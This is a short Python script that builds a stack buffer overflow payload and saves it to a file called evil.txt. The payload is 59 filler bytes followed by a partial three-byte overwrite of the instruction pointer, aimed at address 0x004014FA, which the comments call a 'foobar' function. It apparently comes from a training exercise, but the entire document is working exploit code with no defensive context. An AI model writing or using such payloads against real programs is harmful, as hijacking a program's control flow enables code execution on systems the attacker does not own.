#!/usr/bin/python

#004014FA => address to jump into foobar function()
# to partially over write eip by 3 bytes we need 59 bytes 
# followed by nops

filename="evil.txt"
buffer = "\x41"*59 +"\xFA\x14\x40" 
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()